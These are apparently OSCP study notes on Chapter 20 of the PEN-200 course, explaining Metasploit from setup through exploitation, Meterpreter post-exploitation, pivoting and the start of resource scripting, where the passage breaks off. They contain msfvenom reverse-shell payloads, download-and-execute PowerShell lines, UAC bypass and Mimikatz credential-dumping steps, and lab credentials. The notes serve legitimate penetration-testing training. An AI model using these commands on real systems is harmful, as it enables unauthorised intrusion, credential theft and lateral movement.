---
title: "PEN-200 Chapter 20 — The Metasploit Framework"
aliases:
  - "PEN-200 Ch20 Metasploit"
  - "OSCP Metasploit Framework"
tags:
  - oscp
  - pen-200
  - metasploit
  - meterpreter
  - msfvenom
  - post-exploitation
  - pivoting
  - resource-scripts
source: "PEN-200 — Penetration Testing with Kali Linux, Chapter 20"
chapter: 20
status: "study-note"
---

# PEN-200 Chapter 20 — The Metasploit Framework

> [!summary]
> This chapter introduces the Metasploit Framework (MSF) as a unified framework for enumeration, exploitation, payload delivery, session management, post-exploitation, pivoting, and automation. The chapter focuses on four major learning units: getting familiar with Metasploit, using payloads, post-exploitation, and automation with resource scripts.

> [!important]
> The IP addresses, usernames, passwords, hashes, and payload settings below are the **lab examples used in the chapter**. On an OSCP machine, replace them with the values from your own target and Kali/VPN interfaces.

## Table of Contents

- [[#20.1 Getting Familiar with Metasploit]]
  - [[#20.1.1 Setup and Work with MSF]]
  - [[#20.1.2 Auxiliary Modules]]
  - [[#20.1.3 Exploit Modules]]
- [[#20.2 Using Metasploit Payloads]]
  - [[#20.2.1 Staged vs Non-Staged Payloads]]
  - [[#20.2.2 Meterpreter Payload]]
  - [[#20.2.3 Executable Payloads]]
- [[#20.3 Performing Post-Exploitation with Metasploit]]
  - [[#20.3.1 Core Meterpreter Post-Exploitation Features]]
  - [[#20.3.2 Post-Exploitation Modules]]
  - [[#20.3.3 Pivoting with Metasploit]]
- [[#20.4 Automating Metasploit]]
  - [[#20.4.1 Resource Scripts]]
- [[#20.5 Wrapping Up]]
- [[#Attack Chain Connection]]
- [[#Mini Cheat Sheet]]

---

# 20.1 Getting Familiar with Metasploit

Metasploit is an exploit and post-exploitation framework maintained by Rapid7. Its main value is standardization: instead of manually adapting many unrelated public exploits, you can use a common interface for scanning, exploitation, payload selection, session management, and post-exploitation.

The chapter introduces **modules** as the primary way to interact with MSF. Modules perform tasks such as scanning, enumeration, exploitation, payload delivery, and post-exploitation.

The learning objectives are:

- Set up and navigate Metasploit.
- Use auxiliary modules.
- Leverage exploit modules.

---

## 20.1.1 Setup and Work with MSF

### Why the Metasploit database matters

Metasploit can run without a database, but PostgreSQL lets it store:

- hosts
- services
- vulnerabilities
- credentials
- loot
- notes
- exploitation results

This becomes useful during larger assessments because information gathered by one module can be reused by another.

### Initialize the database

```bash
sudo msfdb init
```

**Tool:** `msfdb`  
**Purpose:** Initializes the Metasploit PostgreSQL database and configuration.

**Arguments:**

- `init` — starts PostgreSQL if necessary, creates the MSF database/users, writes the database configuration, and initializes the schema.

### Enable PostgreSQL at boot

```bash
sudo systemctl enable postgresql
```

**Tool:** `systemctl`  
**Purpose:** Manages systemd services.

**Arguments:**

- `enable` — configures the service to start automatically at boot.
- `postgresql` — the service being enabled.

### Start Metasploit

```bash
sudo msfconsole
```

**Tool:** `msfconsole`  
**Purpose:** Launches the interactive Metasploit console.

Useful variation:

```bash
sudo msfconsole -q
```

- `-q` — quiet mode; hides the startup banner/version information.

### Verify database connectivity

Inside `msfconsole`:

```text
db_status
```

**Purpose:** Confirms whether MSF is connected to its PostgreSQL database.

Expected idea:

```text
[*] Connected to msf. Connection type: postgresql.
```

### Get help

```text
help
```

or:

```text
?
```

**Purpose:** Displays available Metasploit commands.

Important command categories mentioned in the chapter:

- Core Commands
- Module Commands
- Job Commands
- Resource Script Commands
- Database Backend Commands
- Credentials Backend Commands
- Developer Commands

Important navigation/database commands:

| Command | Purpose |
|---|---|
| `search` | Search module names and descriptions |
| `show` | Display modules/options/payloads/etc. |
| `use` | Activate a module |
| `db_nmap` | Run Nmap and automatically store results |
| `hosts` | List discovered hosts |
| `loot` | List collected loot |
| `notes` | List stored notes |
| `services` | List discovered services |
| `vulns` | List vulnerabilities |
| `workspace` | Manage assessment workspaces |
| `creds` | List stored credentials |

### Workspaces

Workspaces prevent data from separate assessments from getting mixed together.

List workspaces:

```text
workspace
```

Create and switch to a workspace:

```text
workspace -a pen200
```

**Arguments:**

- `-a` — add/create a new workspace.
- `pen200` — workspace name.

A newly created workspace becomes the active workspace.

### Run Nmap through Metasploit

```text
db_nmap -A 192.168.50.202
```

**Tool/command:** `db_nmap`  
**Purpose:** Runs Nmap from inside MSF and imports the discovered hosts/services into the database.

**Arguments:**

- `-A` — Nmap aggressive detection: OS detection, version detection, default scripts, and traceroute.
- `192.168.50.202` — target host.

General syntax shown:

```text
db_nmap [--save | [--help | -h]] [nmap options]
```

### Review discovered hosts

```text
hosts
```

**Purpose:** Lists hosts saved in the current workspace database.

### Review discovered services

```text
services
```

Filter by port:

```text
services -p 8000
```

**Arguments:**

- `-p 8000` — show only services using port 8000.

The database lets you quickly answer questions such as “which targets have SMB/445 open?”

### Review module categories

```text
show -h
```

The chapter shows that `show` can display:

```text
all
encoders
nops
exploits
payloads
auxiliary
post
plugins
info
options
missing
advanced
evasion
targets
actions
```

**Why this matters:** Metasploit contains thousands of modules. Knowing how to search and inspect modules is more important than memorizing module names.

### Module naming structure

Modules use slash-delimited hierarchical names, for example:

```text
auxiliary/scanner/smb/smb_version
exploit/windows/smb/psexec
post/multi/manage/autoroute
```

The hierarchy usually communicates:

```text
module-type / platform-or-category / protocol-or-app / operation
```

---

## 20.1.2 Auxiliary Modules

Auxiliary modules perform tasks that are not necessarily direct exploitation, including:

- protocol enumeration
- port scanning
- fuzzing
- sniffing
- password attacks
- vulnerability checks
- information gathering

Typical hierarchies include:

```text
auxiliary/gather/...
auxiliary/scanner/...
auxiliary/fuzzers/...
```

### List auxiliary modules

```text
show auxiliary
```

### Search for SMB auxiliary modules

```text
search type:auxiliary smb
```

**Arguments/search filters:**

- `type:auxiliary` — restrict results to auxiliary modules.
- `smb` — keyword.

The chapter notes that `search` can filter by criteria such as application, module type, CVE ID, operation, and platform.

### Select a module by search index

```text
use 56
```

In the example, index `56` activates:

```text
auxiliary/scanner/smb/smb_version
```

You can also select by full module name:

```text
use auxiliary/scanner/smb/smb_version
```

### Inspect a module

```text
info
```

**Purpose:** Shows module metadata, description, supported targets, options, reliability/stability information, and whether `check` is supported.

For the SMB version module, important options include:

- `RHOSTS` — remote target host(s).
- `THREADS` — number of concurrent scanner threads.

### Show options

```text
show options
```

**Purpose:** Displays module options and whether each is required.

### Show only missing required options

```text
show missing
```

**Purpose:** Quickly identifies required settings that have not been assigned.

### Set an option

```text
set RHOSTS 192.168.50.202
```

**Purpose:** Assigns a value to the current module's datastore.

- `RHOSTS` — one or more remote targets.

### Unset an option

```text
unset RHOSTS
```

**Purpose:** Removes the value assigned to the option in the current module.

### Populate RHOSTS from database results

```text
services -p 445 --rhosts
```

**Purpose:** Finds hosts in the database with TCP/445 and automatically sets those hosts as `RHOSTS`.

**Arguments:**

- `-p 445` — filter database services by port 445.
- `--rhosts` — assign matching hosts to the current module's `RHOSTS`.

This is a useful example of connecting **enumeration data → module targeting**.

### Run the SMB version scanner

```text
run
```

Example result from the chapter identifies SMB versions 2 and 3, with SMB 3.1.1 preferred.

### Display detected vulnerabilities

```text
vulns
```

The chapter's database includes an entry indicating SMB signing is not required.

**Use:** Quickly review vulnerability information that modules have saved.

---

### SSH password attack with an auxiliary module

Search:

```text
search type:auxiliary ssh
```

Select the login scanner by index:

```text
use 15
```

This activates:

```text
auxiliary/scanner/ssh/ssh_login
```

Review options:

```text
show options
```

Important `ssh_login` options shown:

| Option | Meaning |
|---|---|
| `PASSWORD` | One password to test |
| `PASS_FILE` | Password wordlist, one password per line |
| `RHOSTS` | Target host(s) |
| `RPORT` | SSH port; default 22 |
| `STOP_ON_SUCCESS` | Stop guessing after valid credentials are found |
| `THREADS` | Concurrent threads |
| `USERNAME` | One username |
| `USERPASS_FILE` | File containing username/password pairs |
| `USER_AS_PASS` | Try each username as its password |
| `USER_FILE` | Username list |
| `VERBOSE` | Show all attempts |

Set the password list:

```text
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

Set the known username:

```text
set USERNAME george
```

Set the target:

```text
set RHOSTS 192.168.50.201
```

Set the SSH port:

```text
set RPORT 2222
```

Run:

```text
run
```

The chapter obtains:

```text
george:chocolate
```

An important MSF advantage shown here is that a successful login scanner can automatically create a session instead of merely printing the credential.

### Display saved credentials

```text
creds
```

The Metasploit database stores:

- target host
- service/port
- username
- secret/password/hash
- credential type

> [!oscp-tip]
> Auxiliary modules are often most valuable for **enumeration and credential validation**. Use them after Nmap/service discovery to turn raw port information into actionable facts.

---

## 20.1.3 Exploit Modules

Exploit modules contain exploit code for vulnerable applications and services.

The chapter demonstrates exploitation of Apache 2.4.49/2.4.50 path traversal/RCE.

### Create a new exploit workspace

```text
workspace -a exploits
```

### Search for an exploit

```text
search Apache 2.4.49
```

Results include:

```text
exploit/multi/http/apache_normalize_path_rce
auxiliary/scanner/http/apache_normalize_path
```

The auxiliary module checks for the vulnerability; the exploit module attempts exploitation.

### Select the exploit

```text
use 0
```

### Read the module documentation

```text
info
```

The chapter stresses that you should **not blindly run exploit modules**.

Review:

- target platform and architecture
- module description
- side effects
- stability
- reliability
- available targets
- whether `check` is supported
- artifacts or indicators that may be created

Important metadata in the example:

```text
Module side effects:
ioc-in-logs
artifacts-on-disk

Module stability:
crash-safe

Module reliability:
repeatable-session

Available targets:
0 Automatic (Dropper)
1 Unix Command (In-Memory)

Check supported:
Yes
```

### `check`

If `Check supported: Yes`, you can use:

```text
check
```

**Purpose:** Tests whether the target appears vulnerable without performing the full exploit.

### Review exploit and payload options

```text
show options
```

Exploit-specific options shown:

| Option | Meaning |
|---|---|
| `CVE` | Which supported Apache CVE to use |
| `DEPTH` | Path traversal depth |
| `Proxies` | Optional proxy chain |
| `RHOSTS` | Remote host(s) |
| `RPORT` | Remote TCP port |
| `SSL` | Use TLS/SSL |
| `TARGETURI` | Base URI, e.g. `/cgi-bin` |
| `VHOST` | HTTP virtual host |

Payload options shown:

| Option | Meaning |
|---|---|
| `LHOST` | Local callback/listener address or interface |
| `LPORT` | Local callback/listener port |

### Explicitly choose a payload

```text
set payload payload/linux/x64/shell_reverse_tcp
```

This selects a 64-bit Linux **non-staged** TCP reverse shell.

The chapter recommends explicitly choosing the payload instead of relying on the default.

### Verify `LHOST`

Use:

```text
show options
```

Double-check `LHOST` if your Kali system has multiple interfaces. Metasploit may select the wrong interface.

Typical OSCP interfaces could include:

```text
tun0
eth0
```

Use the IP/interface that the target can actually reach.

### Why change LPORT?

Default Metasploit payloads often use:

```text
LPORT 4444
```

This port may be blocked. A port associated with common traffic, such as 80 or 443, may work better depending on the environment.

### Configure the target web service

```text
set SSL false
set RPORT 80
set RHOSTS 192.168.50.16
```

**Arguments:**

- `SSL false` — target is plain HTTP, not HTTPS.
- `RPORT 80` — remote web port.
- `RHOSTS` — target IP.

### Launch exploitation

```text
run
```

Metasploit:

1. starts the matching reverse handler,
2. checks the vulnerability,
3. sends the exploit/payload,
4. opens a session.

The chapter then verifies execution with:

```bash
id
```

Example result:

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Sessions

A **session** represents interactive access to a compromised target.

Background the current shell:

```text
Ctrl+Z
```

Confirm:

```text
Background session 2? [y/N] y
```

List sessions:

```text
sessions -l
```

Interact with session 2:

```text
sessions -i 2
```

**Arguments:**

- `-l` — list sessions.
- `-i <ID>` — interact with a specific session.

Terminate a session:

```text
sessions -k <ID>
```

- `-k` — kill/close a session.

### Jobs

A **job** is a Metasploit operation running in the background.

Run a module as a job:

```text
run -j
```

- `-j` — run the module as a background job.

This is useful when you want to keep a handler/exploit waiting while continuing to work in the console.

> [!oscp-tip]
> Think of **sessions** as your shells and **jobs** as background MSF tasks/listeners.

---

# 20.2 Using Metasploit Payloads

This learning unit covers:

- staged vs non-staged payloads
- Meterpreter
- payload generation with `msfvenom`

---

## 20.2.1 Staged vs Non-Staged Payloads

### Non-staged payload

A non-staged payload is delivered in its entirety with the exploit.

Characteristics:

- all required shellcode is sent at once
- usually more stable
- larger payload size
- easier for a simple listener such as Netcat to handle for basic shells

Example:

```text
linux/x64/shell_reverse_tcp
```

The underscore form is the clue:

```text
shell_reverse_tcp
```

### Staged payload

A staged payload is delivered in parts:

1. a small first-stage payload runs,
2. it connects back,
3. a larger second stage is transferred,
4. the second stage is executed.

Advantages:

- smaller initial payload
- useful when exploit space is limited
- second-stage code can be delivered into memory

Disadvantages:

- requires a handler that understands the staging protocol
- generates additional network activity
- can introduce another failure point

Example:

```text
linux/x64/shell/reverse_tcp
```

The slash between `shell` and `reverse_tcp` indicates the staged form.

### List compatible payloads

```text
show payloads
```

Example results:

```text
payload/linux/x64/shell/reverse_tcp
payload/linux/x64/shell_reverse_tcp
```

### Choose staged payload by index

```text
set payload 15
```

Equivalent example:

```text
set payload linux/x64/shell/reverse_tcp
```

### Run

```text
run
```

The chapter shows a small first stage being sent before an interactive command-shell session is opened.

> [!memory-aid]
> `shell/reverse_tcp` = staged  
> `shell_reverse_tcp` = non-staged / inline

---

## 20.2.2 Meterpreter Payload

Meterpreter is Metasploit's feature-rich payload for post-exploitation.

Important properties emphasized in the chapter:

- dynamically extensible
- runs in memory
- encrypted communication by default
- available for multiple platforms
- provides file transfer, process, network, pivoting, and post-exploitation capabilities

### Display compatible Meterpreter payloads

```text
show payloads
```

Examples from the chapter:

```text
payload/linux/x64/meterpreter/bind_tcp
payload/linux/x64/meterpreter/reverse_tcp
payload/linux/x64/meterpreter_reverse_http
payload/linux/x64/meterpreter_reverse_https
payload/linux/x64/meterpreter_reverse_tcp
```

Select the non-staged TCP Meterpreter example:

```text
set payload 11
```

Equivalent:

```text
set payload linux/x64/meterpreter_reverse_tcp
```

Review options:

```text
show options
```

Typical options:

```text
LHOST
LPORT
```

The chapter's wording notes that Meterpreter has staging internally, while Metasploit still exposes **staged and non-staged transfer forms**. The practical distinction for the exam is the naming convention and handler requirements.

### Run the exploit with Meterpreter

```text
run
```

After a Meterpreter session opens:

```text
help
```

### Core Meterpreter commands shown

| Command | Purpose |
|---|---|
| `?` | Help menu |
| `background` | Background current Meterpreter session |
| `channel` | Manage active channels |
| `close` | Close a channel |
| `info` | Show information about a post module |
| `load` | Load a Meterpreter extension |
| `run` | Run Meterpreter scripts/post modules |
| `secure` | Renegotiate Meterpreter packet encryption |
| `sessions` | Switch sessions quickly |

### Meterpreter system commands shown

| Command | Purpose |
|---|---|
| `execute` | Execute a command/program |
| `getenv` | Read environment variables |
| `getpid` | Show current process ID |
| `getuid` | Show user running Meterpreter |
| `kill` | Terminate a process |
| `localtime` | Show target local time |
| `pgrep` | Find process IDs by name |
| `pkill` | Kill processes by name |
| `ps` | List processes |
| `shell` | Open an OS command shell |
| `suspend` | Suspend/resume processes |
| `sysinfo` | Show OS/architecture/system details |

### Basic target enumeration

```text
sysinfo
getuid
```

`sysinfo` gives OS and architecture information.

`getuid` gives the account under which Meterpreter is running.

### Channels

A Meterpreter session can contain multiple active communication **channels**.

Start an interactive system shell:

```text
shell
```

Run a command:

```bash
id
```

Background the shell channel:

```text
Ctrl+Z
```

Start another shell:

```text
shell
```

Example:

```bash
whoami
```

Background again:

```text
Ctrl+Z
```

List active channels:

```text
channel -l
```

Interact with channel 1:

```text
channel -i 1
```

**Arguments:**

- `-l` — list channels.
- `-i <ID>` — interact with a channel.

### Meterpreter file-system commands shown

| Command | Purpose |
|---|---|
| `cat` | Read remote file |
| `cd` | Change remote directory |
| `checksum` | Calculate remote file checksum |
| `chmod` | Change permissions |
| `cp` | Copy remote file |
| `del` | Delete remote file |
| `dir` | List remote directory; alias of `ls` |
| `download` | Download file/directory from target |
| `edit` | Edit remote file |
| `getlwd` | Show local working directory |
| `getwd` | Show remote working directory |
| `lcat` | Read a local file |
| `lcd` | Change local working directory |
| `lls` | List local files |
| `lpwd` | Print local working directory |
| `ls` | List remote files |
| `mkdir` | Create remote directory |
| `mv` | Move remote file |
| `pwd` | Print remote working directory |
| `rm` | Delete remote file |
| `rmdir` | Remove remote directory |
| `search` | Search for remote files |
| `upload` | Upload file/directory to target |

Commands beginning with `l` act on the **local Kali system**.

### Download `/etc/passwd`

Check local directory:

```text
lpwd
```

Change local directory:

```text
lcd /home/kali/Downloads
```

Verify:

```text
lpwd
```

Download remote file:

```text
download /etc/passwd
```

Read the downloaded local file:

```text
lcat /home/kali/Downloads/passwd
```

### Upload a privilege-escalation tool

```text
upload /usr/bin/unix-privesc-check /tmp/
```

Verify:

```text
ls /tmp
```

**Tool:** `unix-privesc-check`  
**Purpose:** Linux privilege-escalation enumeration script.

The chapter notes that Windows paths may require escaped backslashes.

### Exit Meterpreter

```text
exit
```

### Meterpreter over HTTPS

Display payloads:

```text
show payloads
```

Select:

```text
set payload 10
```

Equivalent:

```text
set payload linux/x64/meterpreter_reverse_https
```

Review:

```text
show options
```

Payload options include:

```text
LHOST
LPORT
LURI
```

- `LURI` — HTTP path used by the handler; if blank, `/` is used.

Launch:

```text
run
```

The HTTPS payload makes Meterpreter's transport resemble HTTPS traffic and encrypts the communication, but the chapter warns that Meterpreter itself is widely detected by security products.

The chapter's practical recommendation is to favor a simpler raw shell for an initial foothold when endpoint defenses may detect Meterpreter, then deploy Meterpreter later if appropriate.

---

## 20.2.3 Executable Payloads

`msfvenom` generates payloads in many formats, including:

- Windows executables
- Linux executables
- PowerShell-related formats
- web shells
- other payload containers

### List Windows x64 payloads

```bash
msfvenom -l payloads --platform windows --arch x64
```

**Arguments:**

- `-l payloads` — list payloads.
- `--platform windows` — only Windows payloads.
- `--arch x64` — only 64-bit payloads.

Examples shown:

```text
windows/x64/shell/reverse_tcp
windows/x64/shell_reverse_tcp
```

### Generate a non-staged Windows reverse shell EXE

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

**Arguments:**

- `-p windows/x64/shell_reverse_tcp` — payload.
- `LHOST=192.168.119.2` — callback IP.
- `LPORT=443` — callback port.
- `-f exe` — output format is Windows executable.
- `-o nonstaged.exe` — output filename.

### Download payload with PowerShell

```powershell
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
```

**Tool:** `Invoke-WebRequest` (`iwr`)  
**Arguments:**

- `-uri` — source URL.
- `-Outfile` — local destination filename.

Execute:

```powershell
.\nonstaged.exe
```

### Receive non-staged shell with Netcat

```bash
nc -nvlp 443
```

**Tool:** Netcat (`nc`)  
**Arguments:**

- `-n` — no DNS resolution.
- `-v` — verbose.
- `-l` — listen mode.
- `-p 443` — local listening port.

A non-staged basic shell can be handled by Netcat.

### Generate a staged Windows reverse shell EXE

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

### Why Netcat fails with staged payloads

Starting:

```bash
nc -nvlp 443
```

accepts the initial connection, but Netcat does not understand how to deliver/manage the second stage. Therefore you do not get a useful interactive shell.

### Use `multi/handler`

Activate:

```text
use multi/handler
```

Set the exact matching payload:

```text
set payload windows/x64/shell/reverse_tcp
```

Review options:

```text
show options
```

Set listener address:

```text
set LHOST 192.168.119.2
```

Set port:

```text
set LPORT 443
```

Run:

```text
run
```

`multi/handler` understands staged payloads and can provide an interactive session.

### Important handler rule

> [!important]
> The handler payload must match the payload embedded in the generated file.

Examples:

```text
Generated: windows/x64/shell/reverse_tcp
Handler:   windows/x64/shell/reverse_tcp
```

### Run handler in background

Exit the shell/session, then:

```text
run -j
```

List jobs:

```text
jobs
```

When the payload connects, Metasploit creates a new session. Then interact with it:

```text
sessions -i <ID>
```

### Where `msfvenom` payloads fit

The chapter highlights several uses:

- upload an executable to an already compromised machine
- create files for client-side attacks
- create web-shell-like payloads
- generate reverse-shell payloads in a standard format

---

# 20.3 Performing Post-Exploitation with Metasploit

After initial access, post-exploitation includes:

- information gathering
- privilege escalation
- credential access
- maintaining useful access
- process migration
- pivoting to other networks/hosts

Metasploit supports this through:

1. Meterpreter built-in commands.
2. post-exploitation modules.
3. extensions such as Kiwi.
4. routing and proxy functionality.

---

## 20.3.1 Core Meterpreter Post-Exploitation Features

The chapter uses a Windows target because Windows Meterpreter provides more post-exploitation features than the Linux version used earlier.

### Generate a Windows Meterpreter HTTPS payload

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```

**Arguments:**

- `-p windows/x64/meterpreter_reverse_https` — 64-bit Windows non-staged Meterpreter over HTTPS.
- `LHOST` — callback IP.
- `LPORT=443` — callback port.
- `-f exe` — Windows EXE.
- `-o met.exe` — output filename.

### Configure `multi/handler`

```text
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
run
```

The chapter's existing handler already has the appropriate local address configured.

### Connect to an existing bind shell

```bash
nc 192.168.50.223 4444
```

Then start PowerShell:

```powershell
powershell
```

Download the Meterpreter executable:

```powershell
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
```

Execute:

```powershell
.\met.exe
```

This produces a new Meterpreter session.

### Check user idle time

```text
idletime
```

**Purpose:** Shows how long the interactive user has been idle.

**Why useful:** It may indicate whether the user is actively using the workstation. This is useful operational context before doing anything visible.

### Check Windows token privileges

Open shell:

```text
shell
```

Then:

```cmd
whoami /priv
```

**Tool:** `whoami`  
**Argument:**

- `/priv` — list privileges assigned to the current access token.

The example identifies:

```text
SeImpersonatePrivilege
```

Exit shell:

```cmd
exit
```

### `getsystem`

Check current Meterpreter user:

```text
getuid
```

Attempt automatic SYSTEM escalation:

```text
getsystem
```

Check again:

```text
getuid
```

The chapter's example succeeds using:

```text
Named Pipe Impersonation (PrintSpooler variant)
```

and obtains:

```text
NT AUTHORITY\SYSTEM
```

**Purpose of `getsystem`:** Try supported Windows privilege-escalation techniques automatically.

> [!important]
> `getsystem` is not magic and will not always work. Its success depends on the target, token privileges, OS configuration, and available techniques.

### Process migration

List processes:

```text
ps
```

The original malicious executable appears as:

```text
met.exe
```

The chapter migrates into a more legitimate process:

```text
migrate 8052
```

**Argument:**

- `8052` — PID of target process.

Verify:

```text
ps
```

Check new user context:

```text
getuid
```

The chapter notes an important restriction: Meterpreter can migrate only into processes at the same or lower integrity/privilege level than the current process permits.

### Spawn a process and migrate to it

Create hidden Notepad:

```text
execute -H -f notepad
```

**Arguments:**

- `-H` — create the process hidden from view.
- `-f notepad` — executable/program to run.

Then migrate:

```text
migrate 2720
```

where `2720` is the newly created PID.

The process is hidden visually, but it still exists in the process list.

### Other Meterpreter features mentioned

```text
hashdump
```

**Purpose:** Dump password hashes from the SAM database when privileges allow.

```text
screenshare
```

**Purpose:** Display the target desktop in real time.

---

## 20.3.2 Post-Exploitation Modules

Post-exploitation modules can operate on an existing session by setting a `SESSION` option.

The chapter demonstrates:

1. UAC bypass.
2. loading the Kiwi/Mimikatz Meterpreter extension.
3. extracting NTLM credentials.

### Migrate to an administrator's medium-integrity process

The chapter repeats:

```text
getsystem
ps
migrate 8044
getuid
```

The resulting user is an administrative account, but the process is still medium integrity because of UAC.

### Check integrity level with NtObjectManager

Open shell:

```text
shell
```

Start PowerShell while bypassing execution policy:

```powershell
powershell -ep bypass
```

**Argument:**

- `-ep bypass` — set execution policy to Bypass for that PowerShell process.

Import the module:

```powershell
Import-Module NtObjectManager
```

Check token integrity:

```powershell
Get-NtTokenIntegrityLevel
```

Initial result:

```text
Medium
```

### Background channel and Meterpreter session

Background PowerShell channel:

```text
Ctrl+Z
```

Background Meterpreter session:

```text
bg
```

Equivalent conceptually to the Meterpreter `background` command.

### Search for UAC bypass modules

```text
search UAC
```

The chapter selects:

```text
exploit/windows/local/bypassuac_sdclt
```

### Activate the UAC bypass

```text
use exploit/windows/local/bypassuac_sdclt
```

Review:

```text
show options
```

Important options:

- `SESSION` — existing Meterpreter session on which the local exploit should run.
- `LHOST` — callback address for the new payload.
- `LPORT` — listener port.
- `PAYLOAD_NAME` — optional payload filename.

Set session:

```text
set SESSION 9
```

Set callback IP:

```text
set LHOST 192.168.119.4
```

Run:

```text
run
```

A new Meterpreter session is created.

### Verify high integrity

```text
shell
```

Then:

```powershell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

Result:

```text
High
```

This confirms successful UAC bypass.

---

### Load Kiwi / Mimikatz functionality

Return to/configure handler:

```text
use exploit/multi/handler
run
```

After obtaining a Meterpreter session, escalate:

```text
getsystem
```

Load Kiwi:

```text
load kiwi
```

Display commands:

```text
help
```

Kiwi commands shown in the chapter:

| Command | Purpose |
|---|---|
| `creds_all` | Retrieve all parsed credentials |
| `creds_kerberos` | Retrieve parsed Kerberos credentials |
| `creds_livessp` | Retrieve LiveSSP credentials |
| `creds_msv` | Retrieve parsed LM/NTLM credentials |
| `creds_ssp` | Retrieve SSP credentials |
| `creds_tspkg` | Retrieve TsPkg credentials |
| `creds_wdigest` | Retrieve WDigest credentials |
| `dcsync` | Retrieve account information using DCSync |
| `dcsync_ntlm` | Retrieve NTLM hash, SID, and RID using DCSync |
| `golden_ticket_create` | Create a Golden Kerberos Ticket |
| `kerberos_ticket_list` | List Kerberos tickets |
| `kerberos_ticket_purge` | Purge Kerberos tickets |
| `kerberos_ticket_use` | Use a Kerberos ticket |
| `kiwi_cmd` | Execute a raw Mimikatz command |
| `lsa_dump_sam` | Dump SAM through LSA functionality |
| `lsa_dump_secrets` | Dump LSA secrets |
| `password_change` | Change a user's password/hash |
| `wifi_list` | List current-user Wi-Fi profiles/credentials |
| `wifi_list_shared` | List shared Wi-Fi profiles/credentials; requires SYSTEM |

Retrieve LM/NTLM material:

```text
creds_msv
```

The chapter demonstrates obtaining an NTLM hash for the local user `luiza`.

> [!attack-chain]
> This section connects **Privilege Escalation → Credentials**: elevate to SYSTEM, load Kiwi, then retrieve credential material that may enable lateral movement or AD attacks.

---

## 20.3.3 Pivoting with Metasploit

Pivoting allows you to reach hosts/networks that your Kali machine cannot directly access.

The compromised host in the chapter has two network interfaces:

```cmd
ipconfig
```

The second interface is on:

```text
172.16.5.0/24
```

### Background the pivot Meterpreter session

```text
bg
```

### Manually add a route

```text
route add 172.16.5.0/24 12
```

**Arguments:**

- `172.16.5.0/24` — internal target network.
- `12` — Meterpreter session used as the gateway/pivot.

Display routes:

```text
route print
```

### Scan through the route with an auxiliary module

Activate TCP scanner:

```text
use auxiliary/scanner/portscan/tcp
```

Set target:

```text
set RHOSTS 172.16.5.200
```

Set ports:

```text
set PORTS 445,3389
```

Run:

```text
run
```

Results show SMB and RDP open.

### Lateral movement through the pivot with PsExec

Activate:

```text
use exploit/windows/smb/psexec
```

Set SMB username:

```text
set SMBUser luiza
```

Set password:

```text
set SMBPass "BoccieDearAeroMeow1!"
```

Set internal target:

```text
set RHOSTS 172.16.5.200
```

### Why a bind payload is used

The chapter uses:

```text
set payload windows/x64/meterpreter/bind_tcp
```

because the manually added MSF route helps Metasploit establish connections **toward** the internal network.

A reverse shell from the internal target may not know how to route back to the Kali network.

Set bind port:

```text
set LPORT 8000
```

Run:

```text
run
```

This opens a Meterpreter session to the internal target **through the existing pivot session**.

> [!oscp-tip]
> When pivoting, think carefully about **traffic direction**:
>
> - Can Kali connect to the target through the pivot? A bind payload may work.
> - Can the internal target route back to Kali? If not, a direct reverse shell may fail.

### Remove manually defined routes

The chapter mentions:

```text
route flush
```

**Purpose:** Remove all manually configured Metasploit routes.

---

### `autoroute` module

Activate:

```text
use multi/manage/autoroute
```

Full module path displayed by MSF:

```text
post/multi/manage/autoroute
```

Review:

```text
show options
```

Important options:

| Option | Purpose |
|---|---|
| `CMD` | `add`, `autoadd`, `print`, `delete`, or `default` |
| `NETMASK` | Netmask/CIDR |
| `SESSION` | Pivot Meterpreter session |
| `SUBNET` | Network to route |

List sessions:

```text
sessions -l
```

Set pivot session:

```text
set session 12
```

Run:

```text
run
```

With `CMD autoadd`, the module discovers routes from the compromised host and adds them to MSF.

---

### SOCKS proxy through Metasploit

Activate:

```text
use auxiliary/server/socks_proxy
```

Review:

```text
show options
```

Important options:

- `SRVHOST` — local bind/listen address.
- `SRVPORT` — proxy listening port; default 1080.
- `VERSION` — SOCKS `4a` or `5`.
- `USERNAME` / `PASSWORD` — optional SOCKS5 authentication.

Bind only to localhost:

```text
set SRVHOST 127.0.0.1
```

Use SOCKS5:

```text
set VERSION 5
```

Run as job:

```text
run -j
```

### Configure ProxyChains

Check/edit:

```bash
tail /etc/proxychains4.conf
```

The relevant configuration is:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

### RDP through ProxyChains

```bash
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

**Tools:**

- `proxychains` — forces supported TCP applications through a configured proxy.
- `xfreerdp` — RDP client.

**Arguments:**

- `/v:172.16.5.200` — RDP server.
- `/u:luiza` — username.

The traffic path is effectively:

```text
xfreerdp → proxychains → localhost:1080 SOCKS → Meterpreter route → pivot → internal target:3389
```

---

### Meterpreter port forwarding

Interact with the pivot session:

```text
sessions -i 12
```

Show port-forward help:

```text
portfwd -h
```

Options shown:

| Option | Meaning |
|---|---|
| `-h` | Help |
| `-i` | Port-forward entry index |
| `-l` | Forward: local port to listen on |
| `-L` | Forward: local host to listen on |
| `-p` | Forward: remote port to connect to |
| `-r` | Remote host to connect to |
| `-R` | Reverse port forward |

Create local port 3389 → internal target 3389:

```text
portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

Test from Kali:

```bash
sudo xfreerdp /v:127.0.0.1 /u:luiza
```

Now the RDP client talks to `127.0.0.1:3389`, and Meterpreter forwards the connection to the internal system.

The chapter notes that if the internal target had access to yet another network, additional pivots could be chained.

---

# 20.4 Automating Metasploit

Metasploit can automate repetitive console operations through **resource scripts**.

Resource scripts can include:

- Metasploit console commands
- Ruby code for control flow and more advanced logic

---

## 20.4.1 Resource Scripts

The chapter creates a resource script named:

```text
listener.rc
```

Its goal is to:

1. start `multi/handler`,
2. configure a Windows Meterpreter HTTPS payload,
